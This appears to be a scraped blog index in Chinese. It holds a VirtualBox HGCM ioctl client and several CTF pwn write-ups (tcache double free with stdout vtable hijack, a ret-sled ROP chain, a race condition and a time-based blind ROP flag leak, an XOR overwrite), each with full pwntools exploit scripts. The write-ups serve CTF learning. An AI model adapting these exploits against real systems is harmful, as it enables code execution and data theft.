VBGL_IOCTL_CODE_SIZE(4, VBGL_IOCTL_HGCM_CONNECT_SIZE)#define VBGL_IOCTL_HGCM_CONNECT_SIZE               sizeof(VBGLIOCHGCMCONNECT)# define VBGL_IOCTL_HGCM_DISCONNECT                 VBGL_IOCTL_CODE_SIZE(5, VBGL_IOCTL_HGCM_DISCONNECT_SIZE)# define VBGL_IOCTL_HGCM_DISCONNECT_SIZE            sizeof(VBGLIOCHGCMDISCONNECT)#define IOCTL_HGCM_CALL 7/** Guest Physical Memory Address; limited to 64 bits.*/typedef uint64_t                RTGCPHYS64;/** Unsigned integer which can contain a 64 bits GC pointer. */typedef uint64_t                RTGCUINTPTR64;/** Guest context pointer, 64 bits. */typedef RTGCUINTPTR64           RTGCPTR64;typedef uint8_t bool;typedef struct VBGLREQHDR&#123;    /** IN: The request input size, and output size if cbOut is zero.     * @sa VMMDevRequestHeader::size  */    uint32_t        cbIn;    /** IN: Structure version (VBGLREQHDR_VERSION)     * @sa VMMDevRequestHeader::version */    uint32_t        uVersion;    /** IN: The VMMDev request type, set to VBGLREQHDR_TYPE_DEFAULT unless this is a     * kind of VMMDev request.     * @sa VMMDevRequestType, VMMDevRequestHeader::requestType */    uint32_t        uType;    /** OUT: The VBox status code of the operation, out direction only. */    int32_t         rc;    /** IN: The output size.  This is optional - set to zero to use cbIn as the     * output size. */    uint32_t        cbOut;    /** Reserved / filled in by kernel, MBZ.     * @sa VMMDevRequestHeader::fRequestor */    uint32_t        uReserved;&#125; VBGLREQHDR;/** * HGCM host service location. * @ingroup grp_vmmdev_req */typedef struct&#123;    char achName[128]; /**&lt; This is really szName. */&#125; HGCMServiceLocationHost;typedef enum&#123;    VMMDevHGCMLoc_Invalid    = 0,    VMMDevHGCMLoc_LocalHost  = 1,    VMMDevHGCMLoc_LocalHost_Existing = 2,    VMMDevHGCMLoc_SizeHack   = 0x7fffffff&#125; HGCMServiceLocationType;/** * HGCM service location. * @ingroup grp_vmmdev_req */typedef struct HGCMSERVICELOCATION&#123;    /** Type of the location. */    HGCMServiceLocationType type;    union    &#123;        HGCMServiceLocationHost host;    &#125; u;&#125; HGCMServiceLocation;typedef struct VBGLIOCHGCMCONNECT&#123;    /** The header. */    VBGLREQHDR                  Hdr;    union    &#123;        struct        &#123;            HGCMServiceLocation Loc;        &#125; In;        struct        &#123;            uint32_t            idClient;        &#125; Out;    &#125; u;&#125; VBGLIOCHGCMCONNECT;/** * For VBGL_IOCTL_HGCM_CALL and VBGL_IOCTL_HGCM_CALL_WITH_USER_DATA. * * @note This is used by alot of HGCM call structures. */typedef struct VBGLIOCHGCMCALL&#123;    /** Common header. */    VBGLREQHDR  Hdr;    /** Input: The id of the caller. */    uint32_t    u32ClientID;    /** Input: Function number. */    uint32_t    u32Function;    /** Input: How long to wait (milliseconds) for completion before cancelling the     * call.  This is ignored if not a VBGL_IOCTL_HGCM_CALL_TIMED or     * VBGL_IOCTL_HGCM_CALL_TIMED_32 request. */    uint32_t    cMsTimeout;    /** Input: Whether a timed call is interruptible (ring-0 only).  This is ignored     * if not a VBGL_IOCTL_HGCM_CALL_TIMED or VBGL_IOCTL_HGCM_CALL_TIMED_32     * request, or if made from user land. */    bool        fInterruptible;    /** Explicit padding, MBZ. */    uint8_t     bReserved;    /** Input: How many parameters following this structure.     *     * The parameters are either HGCMFunctionParameter64 or HGCMFunctionParameter32,     * depending on whether we&#x27;re receiving a 64-bit or 32-bit request.     *     * The current maximum is 61 parameters (given a 1KB max request size,     * and a 64-bit parameter size of 16 bytes).     *     * @note This information is duplicated by Hdr.cbIn, but it&#x27;s currently too much     *       work to eliminate this. */    uint16_t    cParms;    /* Parameters follow in form HGCMFunctionParameter aParms[cParms] */&#125; VBGLIOCHGCMCALL;/** * HGCM parameter type. */typedef enum&#123;    VMMDevHGCMParmType_Invalid            = 0,    VMMDevHGCMParmType_32bit              = 1,    VMMDevHGCMParmType_64bit              = 2,    VMMDevHGCMParmType_PhysAddr           = 3,  /**&lt; @deprecated Doesn&#x27;t work, use PageList. */    VMMDevHGCMParmType_LinAddr            = 4,  /**&lt; In and Out */    VMMDevHGCMParmType_LinAddr_In         = 5,  /**&lt; In  (read;  host&lt;-guest) */    VMMDevHGCMParmType_LinAddr_Out        = 6,  /**&lt; Out (write; host-&gt;guest) */    VMMDevHGCMParmType_LinAddr_Locked     = 7,  /**&lt; Locked In and Out */    VMMDevHGCMParmType_LinAddr_Locked_In  = 8,  /**&lt; Locked In  (read;  host&lt;-guest) */    VMMDevHGCMParmType_LinAddr_Locked_Out = 9,  /**&lt; Locked Out (write; host-&gt;guest) */    VMMDevHGCMParmType_PageList           = 10, /**&lt; Physical addresses of locked pages for a buffer. */    VMMDevHGCMParmType_Embedded           = 11, /**&lt; Small buffer embedded in request. */    VMMDevHGCMParmType_ContiguousPageList = 12, /**&lt; Like PageList but with physically contiguous memory, so only one page entry. */    VMMDevHGCMParmType_SizeHack           = 0x7fffffff&#125; HGCMFunctionParameterType;#  pragma pack(4)typedef struct&#123;    HGCMFunctionParameterType type;    union    &#123;        uint32_t   value32;        uint64_t   value64;        struct        &#123;            uint32_t size;            union            &#123;                RTGCPHYS64 physAddr;                RTGCPTR64  linearAddr;            &#125; u;        &#125; Pointer;        struct        &#123;            uint32_t size;   /**&lt; Size of the buffer described by the page list. */            uint32_t offset; /**&lt; Relative to the request header, valid if size != 0. */        &#125; PageList;        struct        &#123;            uint32_t fFlags : 8;        /**&lt; VBOX_HGCM_F_PARM_*. */            uint32_t offData : 24;      /**&lt; Relative to the request header, valid if cb != 0. */            uint32_t cbData;            /**&lt; The buffer size. */        &#125; Embedded;    &#125; u;&#125; HGCMFunctionParameter64;typedef struct VBGLIOCHGCMDISCONNECT&#123;    /** The header. */    VBGLREQHDR          Hdr;    union    &#123;        struct        &#123;            uint32_t    idClient;        &#125; In;    &#125; u;&#125; VBGLIOCHGCMDISCONNECT;#endif\nhgcm.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;stdarg.h&gt;#include &quot;hgcm.h&quot;void die(char *msg) &#123;   perror(msg);   exit(-1);&#125;//device fdint fd;int hgcm_connect(const char *service_name) &#123;   VBGLIOCHGCMCONNECT data = &#123;      .Hdr.cbIn = sizeof(VBGLIOCHGCMCONNECT),      .Hdr.uVersion = VBGLREQHDR_VERSION,      .Hdr.uType = VBGLREQHDR_TYPE_DEFAULT,      .Hdr.rc = VERR_INTERNAL_ERROR,      .Hdr.cbOut = sizeof(VBGLREQHDR) + sizeof(uint32_t),      .Hdr.uReserved = 0,      .u.In.Loc.type = VMMDevHGCMLoc_LocalHost_Existing   &#125;;   memset(data.u.In.Loc.u.host.achName,0,128);   strncpy(data.u.In.Loc.u.host.achName,service_name,128);   ioctl(fd,VBGL_IOCTL_HGCM_CONNECT,&amp;data);   if (data.Hdr.rc) &#123; //error      return -1;   &#125;   return data.u.Out.idClient;&#125;HGCMFunctionParameter64 arg_buf[0x100];int hgcm_call(int client_id,int func,char *params_fmt,...) &#123;   va_list ap;   char *p,*bval,*type;   uint32_t ival;   uint64_t lval;   HGCMFunctionParameter64 params;   uint16_t index = 0;   va_start(ap,params_fmt);   for(p = params_fmt;*p;p++) &#123;      if(*p!=&#x27;%&#x27;) &#123;         continue;      &#125;      switch (*++p) &#123;         case &#x27;u&#x27;: //整数类型            ival = va_arg(ap,uint32_t);            params.type = VMMDevHGCMParmType_32bit;            params.u.value64 = 0;            params.u.value32 = ival;            arg_buf[index++] = params;            break;         case &#x27;l&#x27;:            lval = va_arg(ap,uint64_t);            params.type = VMMDevHGCMParmType_64bit;            params.u.value64 = lval;            arg_buf[index++] = params;         case &#x27;b&#x27;: //buffer类型            type = va_arg(ap,char *);            bval = va_arg(ap,char *);            ival = va_arg(ap,uint32_t);            if (!strcmp(type,&quot;in&quot;)) &#123;               params.type = VMMDevHGCMParmType_LinAddr_In;            &#125; else if (!strcmp(type,&quot;out&quot;)) &#123;               params.type = VMMDevHGCMParmType_LinAddr_Out;            &#125; else &#123;               params.type = VMMDevHGCMParmType_LinAddr;            &#125;            params.u.Pointer.size = ival;            params.u.Pointer.u.linearAddr = (uintptr_t)bval;            arg_buf[index++] = params;            break;      &#125;   &#125;   va_end(ap);   //printf(&quot;params count=%d\\n&quot;,index);   uint8_t *data_buf = (uint8_t *)malloc(sizeof(VBGLIOCHGCMCALL) + sizeof(HGCMFunctionParameter64)*index);   VBGLIOCHGCMCALL data = &#123;      .Hdr.cbIn = sizeof(VBGLIOCHGCMCALL) + sizeof(HGCMFunctionParameter64)*index,      .Hdr.uVersion = VBGLREQHDR_VERSION,      .Hdr.uType = VBGLREQHDR_TYPE_DEFAULT,      .Hdr.rc = VERR_INTERNAL_ERROR,      .Hdr.cbOut = sizeof(VBGLIOCHGCMCALL) + sizeof(HGCMFunctionParameter64)*index,      .Hdr.uReserved = 0,      .u32ClientID = client_id,      .u32Function = func,      .cMsTimeout = 100000, //忽略      .fInterruptible = 0,      .bReserved = 0,      .cParms = index   &#125;;   memcpy(data_buf,&amp;data,sizeof(VBGLIOCHGCMCALL));   memcpy(data_buf+sizeof(VBGLIOCHGCMCALL),arg_buf,sizeof(HGCMFunctionParameter64)*index);   /*for (int i=0;i&lt;sizeof(VBGLIOCHGCMCALL)+sizeof(HGCMFunctionParameter64)*index;i++) &#123;      printf(&quot;%02x&quot;,data_buf[i]);   &#125;   printf(&quot;\\n&quot;);*/   ioctl(fd,VBGL_IOCTL_CODE_SIZE(IOCTL_HGCM_CALL,sizeof(VBGLIOCHGCMCALL) + sizeof(HGCMFunctionParameter64)*index),data_buf);   int error = ((VBGLIOCHGCMCALL *)data_buf)-&gt;Hdr.rc;   free(data_buf);   if (error) &#123; //error      return error;   &#125;   /*for (int i=0;i&lt;sizeof(VBGLIOCHGCMCALL)+sizeof(HGCMFunctionParameter64)*index;i++) &#123;      printf(&quot;%02x&quot;,data_buf[i]);   &#125;   printf(&quot;\\n&quot;);*/   return 0;&#125;int hgcm_disconnect(int client_id) &#123;   VBGLIOCHGCMDISCONNECT data = &#123;      .Hdr.cbIn = sizeof(VBGLIOCHGCMDISCONNECT),      .Hdr.uVersion = VBGLREQHDR_VERSION,      .Hdr.uType = VBGLREQHDR_TYPE_DEFAULT,      .Hdr.rc = VERR_INTERNAL_ERROR,      .Hdr.cbOut = sizeof(VBGLREQHDR),      .Hdr.uReserved = 0,      .u.In.idClient = client_id,   &#125;;   ioctl(fd,VBGL_IOCTL_HGCM_DISCONNECT,&amp;data);   if (data.Hdr.rc) &#123; //error      return -1;   &#125;   return 0;&#125;int main() &#123;   //打开设备   fd = open(&quot;/dev/vboxuser&quot;,O_RDWR);   if (fd == -1) &#123;      die(&quot;open device error&quot;);   &#125;   int idClient = hgcm_connect(&quot;VBoxGuestPropSvc&quot;);   printf(&quot;idClient=%d\\n&quot;,idClient);   char ans[0x100] = &#123;0&#125;;   int ret = hgcm_call(idClient,2,&quot;%b%b&quot;,&quot;in&quot;,&quot;foo&quot;,4,&quot;in&quot;,&quot;bar&quot;,4);   ret = hgcm_call(idClient,1,&quot;%b%b%u%u&quot;,&quot;in&quot;,&quot;foo&quot;,4,&quot;out&quot;,ans,0x100,0,0);   printf(&quot;%s\\n&quot;,ans);   printf(&quot;%d\\n&quot;,hgcm_disconnect(idClient));&#125;\n\n0x03 感想学习漏洞挖掘，不应该只依赖于现成的库或工具，就像本文，虽然niklasb大牛已经封装了3dpwn库，但是对于我们研究员来说，还是得先自己弄懂，自己动手写工具，才能明白其本质。\n0x04 参考链接Investigating generic problems with the Linux Guest Additionscorelabs-Breaking_Out_of_VirtualBox_through_3D_Acceleration-Francisco_Falcon.pdf\n","categories":["安全研究"],"tags":["虚拟机逃逸","VirtualBox"]},{"title":"vn_pwn_easyTHeap(劫持IO_2_1_stdout的虚表)","url":"/2020/04/09/vn_pwn_easyTHeap/","content":"首先，已知libc版本为2.27，所以存在tcache机制，并且可以随意的double free tcache bin的chunk。\n然后，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下程序\n存在UAF漏洞，因此可以double free，对于glibc 2.27，可以很轻松的利用\n\n\n主函数里，对调用功能的次数做了限制，即**[add功能能用7次，delete功能能用3次。]{.mark}**\n\n\n首先，从泄露libc地址到实现任意地址写，直接快速的写出了exp\n#coding:utf8from pwn import *#sh = process(&#x27;./vn_pwn_easyTHeap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25670)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0x4f322def add(size):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size?&#x27;,str(size))def edit(index,content):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))#0add(0x100)#1add(0x100)#double freedelete(0)delete(0)show(0)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x10print &#x27;heap_addr=&#x27;,hex(heap_addr)#2add(0x100)#3add(0x100)#4申请到了tcache count处，我们修改countadd(0x100)#现在可以得到unsorted bin了delete(0)show(0)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sone_gadget_addr = libc_base + one_gadgetprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)edit(2,p64(evil_addr))#5add(0x100)#6申请到evil_addr处add(0x100)sh.interactive()\n\n显然，上面任意地址读写已经实现，我们通过edit(6)和show(6)来实现。如果我们改写malloc_hook或者free_hook，可以改写成功，但是没有办法触发。这是因为，我们已经用完了add功能的7次调用，delete功能的3次调用。因此，接下来，我们调用不了malloc或free，也就无法触发了。因此，我们可以劫持_IO_2_1_stdout_的虚表。思想就如同house of orange一样，通过IO流对虚表的调用来触发one_gadget。由于glibc为2.29，因此不能直接伪造虚表，而应该将虚表劫持为_IO_str_jumps_附近。\n我们先把虚表劫持为_IO_str_jumps_附近，然后用IDA调试。\nedit(6,p64(_IO_str_jumps_addr - 0x50))\n我们需要在puts处断点，因为我们修改后，这里是第一个puts，它会调用stdout里相关的虚表\n\n\n\n\n我们单步跟进\n然后，我们看到这里r13就是虚表指针,这里会call [r13+0x38]处的函数。\n\n\n因此，我们只需要让[r13+0x38]为IO_str_finish函数的指针即可，因此，我们需要将虚表修改为IO_str_jumps – XX，使得，r13+0x38正好对应上_IO_str_finish指针。\n而之前在house of orange里已经介绍过,_IO_str_finish函数会call [IO_2_1_stdout + 0xE8]\n\n\nCall的前提是_IO_2_1_stdout_的flag的低1字节要为0。综上，我们需要劫持_IO_2_1_stdout_结构体，修改flags，劫持虚表为IO_str_jumps – XX，修改_IO_2_1_stdout_+0xE8处为one_gadget。然后puts的调用即可触发one_gadget。\n#coding:utf8from pwn import *#sh = process(&#x27;./vn_pwn_easyTHeap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25670)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]def get_IO_str_jumps():   IO_file_jumps_offset = libc.sym[&#x27;_IO_file_jumps&#x27;]   IO_str_underflow_offset = libc.sym[&#x27;_IO_str_underflow&#x27;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):      possible_IO_str_jumps_offset = ref_offset - 0x20      if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:         return possible_IO_str_jumps_offset_IO_str_jumps_s = get_IO_str_jumps()one_gadget = 0x4f322def add(size):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size?&#x27;,str(size))def edit(index,content):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;idx?&#x27;,str(index))#0add(0x100)#1add(0x100)#double freedelete(0)delete(0)show(0)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x10print &#x27;heap_addr=&#x27;,hex(heap_addr)#2add(0x100)#3add(0x100)#4申请到了tcache count处，我们修改countadd(0x100)#现在可以得到unsorted bin了delete(0)show(0)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_s_IO_2_1_stdout_addr = libc_base + _IO_2_1_stdout_s_IO_str_jumps_addr = libc_base + _IO_str_jumps_sone_gadget_addr = libc_base + one_gadgetprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)print &#x27;_IO_2_1_stdout_addr=&#x27;,hex(_IO_2_1_stdout_addr)print &#x27;_IO_str_jumps_addr=&#x27;,hex(_IO_str_jumps_addr)print hex(libc_base + 0x5E703)vtable_jump = _IO_str_jumps_addr - 0x28edit(2,p64(_IO_2_1_stdout_addr))#5add(0x100)#6add(0x100)#修改vtable为IO_str_jumps，就会调用_IO_2_1_stdout_addr+0xE8处的函数指针#raw_input()fake_file = p64(0x0FBAD2886)fake_file += p64(_IO_2_1_stdout_addr + 0x200)*7fake_file += p64(_IO_2_1_stdout_addr + 0x201)fake_file += p64(0)*5fake_file += p32(1) #filenofake_file += p32(0) + p64(0xFFFFFFFFFFFFFFFF)fake_file += &#x27;\\x00\\x00\\x00\\n&#x27; + p32(0)fake_file += p64(libc_base + 0x3ED8C0) #_IO_stdfile_1_lockfake_file += p64(0xFFFFFFFFFFFFFFFF)fake_file += p64(0)fake_file += p64(libc_base + 0x3EB8C0) #_IO_wide_data_1fake_file += p64(0)*3fake_file += p32(0xFFFFFFFF)fake_file = fake_file.ljust(0xD8,&#x27;\\x00&#x27;)fake_file += p64(vtable_jump) + p64(0) + p64(one_gadget_addr)edit(6,fake_file)sh.interactive()","categories":["CTF"],"tags":["tcache","UAF","IO FILE"]},{"title":"vn_pwn_warmup(利用ret滑行到rop里)","url":"/2020/04/09/vn_pwn_warmup/","content":"首先，检查一下程序的保护机制\n\n\n程序开启了沙箱保护\n\n\n禁用了execve调用。\n然后我们用IDA分析一下，这里没有栈溢出。\n\n\n然后，我们进入9A1这个函数\n\n\n这里可以栈溢出，但是仅仅能溢出0x10个字节，显然是不够我们完成open、read、write操作的。\n但是，由于该函数是在9D3函数里调用，因此,**[9A1函数的栈下方就是9D3的栈空间。]{.mark}**因此我们可以在9D3的buf里布置rop，然后，在9A1里利用溢出，覆盖返回地址为ret的地址，使得rsp滑行到9D3的buf里，进而执行在9D3里布下的rop链。\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./vn_pwn_warmup&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25249)sh.recvuntil(&#x27;gift: &#x27;)puts_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)open_addr = libc_base + libc.dump(&#x27;open&#x27;)read_addr = libc_base + libc.dump(&#x27;read&#x27;)bss_addr = libc_base + 0x00000000003C5920pop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92ret = libc_base + 0x0000000000000937#read(0,bss_addr,8)输入flag字符串rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(read_addr)#open(bss_addr,0)rop += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)#read(fd,bss_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(bss_addr)rop += p64(pop_rdi) + p64(bss_addr) + p64(puts_addr)sh.sendlineafter(&#x27;Input something:&#x27;,rop)#使用ret滑到先前布置的rop里payload = &#x27;a&#x27;*0x78 + p64(ret)sh.sendafter(&quot;What&#x27;s your name?&quot;,payload)sleep(0.5)sh.send(&#x27;/flag\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["栈溢出","ROP"]},{"title":"Waterdrop","url":"/2020/02/17/waterdrop/","content":"首先，我们检查一下程序的保护机制\n\n\n解法一然后，我们用IDA分析一下，在guess_secret函数里，存在一个**[伪条件竞争的漏洞]{.mark}**\n\n\nV11为有符号数，而j为无符号数，v11如果为负数，比如-1，那么根j比较时，v11会先转成无符号数，因此**[变成最大值。那么循环就要很多次，导致结束这个需要循环有一定的时间。]{.mark}**\n然后，我们注意到**[open的flag里有O_TRUNC标志位，那么会导致文件在打开时，原先内容清空。]{.mark}**\n也就是在执行循环时，&#x2F;tmp&#x2F;secret文件内容是空的，此时我们同时再开另一个线程去连接，输出次数1次，很快完成，然后读取secret文件内容为空，把16个空字节进行MD5加密，得到密码。因此，我们只要在第二个线程输入16个空字节进行MD5加密的结果，即可执行后门函数，显示出flag。\n那么，我们的exp脚本\n#coding:utf8  from pwn import *  import hashlib  #伪条件竞争  sh1 = process(&#x27;./waterdrop&#x27;)  sh2 = process(&#x27;./waterdrop&#x27;)    def init_connection(sh):     sh.send(&#x27;RPCM&#x27;)     sh.send(p32(0))     sh.send(p32(666,endian = &#x27;big&#x27;))    def guess(sh,times):     sh.sendlineafter(&#x27;please input your name&#x27;,&#x27;zhaohai&#x27;)     sh.sendlineafter(&#x27;Do you want to guess my secert?&#x27;,&#x27;y&#x27;)     sh.sendlineafter(&#x27;Input how many rounds do you want to encrypt the secert:&#x27;,str(times))     #sh.sendafter(&#x27;Try to guess the md5 of the secert&#x27;,secret)    #初始化连接  init_connection(sh1)  init_connection(sh2)  guess(sh1,-1)  guess(sh2,1)  m = hashlib.md5()  m.update(&#x27;\\x00&#x27;*0x10)  sh2.sendafter(&#x27;Try to guess the md5 of the secert&#x27;,m.digest())    sh2.interactive()  \n\n解法二程序还存在另外一个漏洞\n\n\n栈溢出，但是关闭了文件描述符0和1，并且使用了沙盒，限制只能使用open和read。并且本题也反弹不了shell。因为glibc并没有静态编译到这个二进制文件，导致很多函数我们不知道地址，也没法泄露。就犹如黑盒一样。\n我们借鉴web攻击的思想，即盲注。\n在csu_init处，有这么一句代码很关键\n\n\nRbx和rbp我们都可以控制，假如，[我们让rbp里保存着flag内容的一个字符的值]{.mark}，然后，[我们控制rbx的值，每次尝试给rbx不同的字符值]{.mark}，如果rbx和rbp里值一样，说明我们猜对了这个字符，那么会执行下面几个pop，然后退出函数，我们在ret时，[再rop到sleep函数，休眠几秒]{.mark}。如果rbx和rbp不一样，则继续向上执行循环，最后到call qword ptr[r12+rbx*12]时崩溃。\n那么，我们就可以判断脚本与服务器断开的时间长短，来判断我们是否猜对了当前的字符。正好，本题也有sleep函数，并且没有禁用sleep。\n为了让rbp里保存flag中的一个字符的值，我们**[要保证rbp寄存器里其他位置为0]{.mark}**。\n为了读取flag文件里接下来的一个字符存储到rbp里，我们得用一点技巧，这种技巧有点像物理里面的相对论。\nRead时的参数因这样变化\n#通过将存储flag的地址位置上移动，达到读取下一个字符的作用  rop += p64(0x1+index) + p64(bss_addr-index) + p64(0)  \n\n\n\n\n我们读取1个字符，存储到bss_addr处\n\n我们读取2个字符，存储到bss_addr-1处\n\n我们读取3个字符，存储到bss_addr-2处\n\n\n这样，[对于bss_addr处，这里始终只保存着一个字符。并且是我们需要的下一个字符。]{.mark}\n因为，我们要把flag的内容写到一个地方，而PIE没开，我们就可以写到我们已知的bss段上，然而要把flag里的字符放rbp里，怎么办，**[单纯的pop_rbp不可行，我们应该利用栈转移，转移到bss_addr时，会pop rbp，然后会继续执行bss_addr+处的rop。]{.mark}**因此，我们还需在bss_addr+8处布置剩下的rop。而程序一开始提供了写bss的功能\n\n\n综上，我们的exp脚本\n#coding:utf8  from pwn import *  import time    elf = ELF(&#x27;./waterdrop&#x27;)  open_plt = elf.plt[&#x27;open&#x27;]  read_got = elf.got[&#x27;read&#x27;]  sleep_plt = elf.plt[&#x27;sleep&#x27;]  bss_addr = 0x607220  flag_str = 0x404C53  pop_rdi = 0x404B23  #pop rsi;pop r15;ret  pop_rsi = 0x404B21  leave_ret = 0x40177a  csu_pop = 0x404B1A  csu_call = 0x404B00  cmp_rbx_rbp = 0x404B11    def init_connection():     global sh     sh = process(&#x27;./waterdrop&#x27;)     sh.send(&#x27;RPCM&#x27;)     sh.send(p32(0))     sh.send(p32(666,endian = &#x27;big&#x27;))    def stackoverflow(payload):     #盲注成功，休眠10s，不成功，崩溃     bss_rop = &#x27;\\x00&#x27;*8 + p64(cmp_rbx_rbp) + p64(0)*7 + p64(pop_rdi) + p64(10) + p64(sleep_plt)     sh.sendlineafter(&#x27;please input your name&#x27;,bss_rop)     sh.sendlineafter(&#x27;Do you want to guess my secert?&#x27;,&#x27;n&#x27;)     sh.send(payload)    #flag里面可能出现的字符  possible_char = []  for x in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1):     possible_char.append(chr(x))  for x in range(0,10):     possible_char.append(str(x))  possible_char.append(&#x27;&#123;&#x27;)  possible_char.append(&#x27;&#125;&#x27;)  possible_char.append(&#x27;\\x00&#x27;)    OK = False  flag = &#x27;&#x27;  index = 0  while not OK:     for guess_char in possible_char:        print &#x27;guess (&#x27;,index,&#x27;) &#x27;,guess_char        init_connection()        #open(&#x27;flag&#x27;,0)        rop = p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0)*2 + p64(open_plt)        #ret2csu        #read(fd=0,bss_addr,1)        rop += p64(csu_pop)        rop += p64(0) + p64(1)        rop += p64(read_got)        #通过将存储flag的地址位置上移动，达到读取下一个字符的作用        rop += p64(0x1+index) + p64(bss_addr-index) + p64(0)        rop += p64(csu_call)        rop += p64(0)        #rbx = guess_char        rop += p64(ord(guess_char))        #rbp        rop += p64(bss_addr)        rop += p64(0)*4        #执行完rop后栈转移到bss上        payload = &#x27;a&#x27;*0x89 + rop + p64(leave_ret)        stackoverflow(payload)        sh.recv()        start = time.time()        sh.can_recv_raw(timeout = 4)        end = time.time()        #print &#x27;time=&#x27;,end - start        sh.close()        if end - start &gt; 3:           if guess_char == &#x27;\\x00&#x27;:              OK = True           flag += guess_char           print &#x27;success guess char at(&#x27;,index,&#x27;)&#x27;           index+=1           break;     print &#x27;flag=&#x27;,flag  sh.interactive()  \n\n假如没有sleep函数，怎么办？我们仍然可以盲注，我们可以利用栈转移构成一个死循环。当我们执行到最后时，程序把栈转移到前面，这样一直在做重复的事情，使得程序不结束，达到延时的目的。具体可以自行研究。\n","categories":["CTF"],"tags":["栈溢出","盲注","条件竞争"]},{"title":"watevr_2019_5x5_lightsout","url":"/2020/08/16/watevr-2019-5x5-lightsout/","content":"\n\n根据这里的越界异或，将返回地址改为one_gadget。其中注意到能够异或的值是有限定的，可以异或(7 &lt;&lt; (i - 1))的值，如下\n00000011000001110000111000011100001110000111000011100000110000001000000000000000\n可以发现，这样值已经可以构造任意的值了。如下exp，是假设存在借位的情况，因此需要一定的概率才能成功\n#coding:utf8from pwn import * #sh = process(&#x27;./watevr_2019_5x5_lightsout&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28016)sh.sendlineafter(&#x27;Press enter to run M-x 5x5&#x27;,&#x27;&#x27;) sh.sendlineafter(&#x27;Board size (1 to 8)?&#x27;,&#x27;1&#x27;)  sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 0 50&#x27;) sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 0 49&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 2 49&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 3 49&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 4 49&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 7 49&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 8 49&#x27;)  sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 4 48&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; 